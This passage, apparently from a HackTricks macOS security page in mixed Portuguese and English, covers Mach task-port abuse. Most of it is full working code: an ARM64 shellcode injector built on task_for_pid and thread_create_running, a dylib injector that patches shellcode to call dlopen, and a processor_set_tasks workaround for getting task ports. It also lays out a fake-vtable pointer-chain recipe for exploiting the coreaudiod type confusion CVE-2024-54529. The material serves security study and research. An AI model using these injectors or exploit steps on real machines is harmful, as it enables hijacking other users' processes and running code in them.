char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> Para que isso funcione no iOS você precisa da entitlement `dynamic-codesigning` para poder tornar uma memória gravável executável.

### Dylib Injection in thread via Task port

No macOS **threads** podem ser manipuladas via **Mach** ou usando a API posix `pthread` api. A thread que geramos na injeção anterior foi criada usando Mach api, então **não é posix compliant**.

Foi possível **inject a simple shellcode** para executar um comando porque **não precisava trabalhar com apis compatíveis com posix**, apenas com Mach. **More complex injections** exigiriam que a **thread** também fosse **posix compliant**.

Portanto, para melhorar a thread ela deve chamar **`pthread_create_from_mach_thread`** que irá **create a valid pthread**. Em seguida, esse novo pthread poderia **call dlopen** para **load a dylib** do sistema, então em vez de escrever novo shellcode para realizar diferentes ações é possível carregar bibliotecas customizadas.

Você pode encontrar **example dylibs** em (por exemplo o que gera um log e então você pode escutá-lo):


{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

Nesta técnica uma thread do processo é sequestrada:


{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Task Port Injection Detection

Ao chamar `task_for_pid` ou `thread_create_*` é incrementado um contador na struct task do kernel, que pode ser acessado do modo usuário chamando task_info(task, TASK_EXTMOD_INFO, ...)

## Exception Ports

Quando uma exceção ocorre em uma thread, essa exceção é enviada para a exception port designada da thread. Se a thread não a tratar, ela é enviada para os task exception ports. Se o task não tratar, então é enviada para o host port que é gerido pelo launchd (onde será acknowledge). Isso é chamado de exception triage.

Note que, no final, se não for tratado corretamente o relatório acabará sendo tratado pelo daemon ReportCrash. No entanto, é possível que outra thread no mesmo task gerencie a exceção — é isso que ferramentas de crash reporting como `PLCreashReporter` fazem.

## Other Objects

### Clock

Qualquer usuário pode acessar informações sobre o clock; no entanto, para ajustar o horário ou modificar outras configurações é necessário ser root.

Para obter info é possível chamar funções do subsistema `clock` como: `clock_get_time`, `clock_get_attributtes` ou `clock_alarm`\
Para modificar valores o subsistema `clock_priv` pode ser usado com funções como `clock_set_time` e `clock_set_attributes`

### Processors and Processor Set

As APIs do processor permitem controlar um único processor lógico chamando funções como `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...

Além disso, as APIs de **processor set** fornecem uma forma de agrupar múltiplos processors em um grupo. É possível recuperar o processor set padrão chamando **`processor_set_default`**.\
Estas são algumas APIs interessantes para interagir com o processor set:

- `processor_set_statistics`
- `processor_set_tasks`: Return an array of send rights to all tasks inside the processor set
- `processor_set_threads`: Return an array of send rights to all threads inside the processor set
- `processor_set_stack_usage`
- `processor_set_info`

Como mencionado em [**this post**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/), no passado isso permitia contornar a proteção mencionada para obter task ports em outros processos e controlá‑los chamando **`processor_set_tasks`** e obtendo um host port em cada processo.\
Hoje em dia é preciso ser root para usar essa função e ela está protegida, de modo que você só poderá obter esses ports em processos não protegidos.

Você pode tentar com:

<details>

<summary><strong>processor_set_tasks code</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:


{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:


{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## MIG handler type confusion -> fake vtable pointer-chain hijack

If a MIG handler **retrieves a C++ object by Mach message-supplied ID** (e.g., from an internal Object Map) and then **assumes a specific concrete type without validating the real dynamic type**, later virtual calls can dispatch through attacker-controlled pointers. In `coreaudiod`’s `com.apple.audio.audiohald` service (CVE-2024-54529), `_XIOContext_Fetch_Workgroup_Port` used the looked-up `HALS_Object` as an `ioct` and executed a vtable call via:

```asm
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x168]  ; indirect call through vtable slot
```

Because `rax` comes from **multiple dereferences**, exploitation needs a structured pointer chain rather than a single overwrite. One working layout:

1. In the **confused heap object** (treated as `ioct`), place a **pointer at +0x68** to attacker-controlled memory.
2. At that controlled memory, place a **pointer at +0x0** to a **fake vtable**.
3. In the fake vtable, write the **call target at +0x168**, so the handler jumps to attacker-chosen code when dereferencing `[rax+0x168]`.

Conceptually:

```
HALS_Object + 0x68  -> controlled_object
*(controlled_object + 0x0) -> fake_vtable
*(fake_vtable + 0x168)     -> RIP target
```

### LLDB triage to anchor the gadget

1. **Break on the faulting handler** (or `mach_msg`/`dispatch_mig_server`) and trigger the crash to confirm the dispatch chain (`HALB_MIGServer_server -> dispatch_mig_server -> _XIOContext_Fetch_Workgroup_Port`).
2. In the crash frame, disassemble to capture the **indirect call slot offset** (`call qword ptr [rax + 0x168]`).
3. Inspect registers/memory to verify where `rdi` (base object) and `rax` (vtable pointer) originate and whether the offsets above are reachable with controlled data.
4. Use the offset map to heap-shape the **0x68 -> 0x0 -> 0x168** chain and convert the type confusion into a reliable control-flow hijack inside the Mach service.

## References

- [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
- [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)
- [Project Zero – Sound Barrier 2](https://projectzero.google/2026/01/sound-barrier-2.html)
{{#include ../../../../banners/hacktricks-training.md}}
